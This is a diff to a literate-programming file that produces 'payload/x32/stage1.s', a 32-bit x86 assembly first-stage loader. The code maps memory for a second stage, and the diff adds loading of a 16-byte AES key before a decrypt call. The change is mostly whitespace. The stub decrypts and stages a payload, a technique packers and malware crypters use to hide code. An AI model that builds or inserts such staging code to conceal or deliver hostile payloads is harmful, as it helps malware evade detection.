@@ -1356,24 +1356,24 @@ _start:
 #+end_src
 
 #+begin_src asm :tangle payload/x32/stage1.s :mkdirp yes
-        global _start
+  global _start
 
-        _start:
-        .mmap_stage_2:
-          	xor    ebp, ebp 	;offset
-          	push -1			;
-          	pop    edi		;fd
+  _start:
+  .mmap_stage_2:
+         	xor    ebp, ebp 	;offset
+         	push -1			;
+         	pop    edi		;fd
         	push 0x22
         	pop esi
         	push 0x3		;RW-
         	pop edx
         	mov ecx, 0xfeffffff	; (len) s2
         	push ecx		;[esp] (len) s2
-          	xor    ebx,ebx 		;Vaddr
+         	xor    ebx,ebx 		;Vaddr
         	mov eax, 192
         	int 0x80
-          	cmp eax, -4095		;Mmap error.
-          	jae _exit
+         	cmp eax, -4095		;Mmap error.
+         	jae _exit
         	pop ecx			; (len) s2 [esp]
         	push eax		; [esp] (vaddr) s2
         	push ecx		; [esp] (len, vaddr) s2
@@ -1391,6 +1391,13 @@ _start:
         	push edx	;-> in_len
         	push edi	;-> out
         	push edx	;-> out_len
+  .set_aes_key:
+  	call  .param_aes_key
+  	times 16 ret
+  .param_aes_key:
+  	pop eax
+  	movdqu xmm0, [eax]
+  .call_decrypt:
         	call decrypt	;What does he need.
         	add esp, 0x10
         	test eax, eax
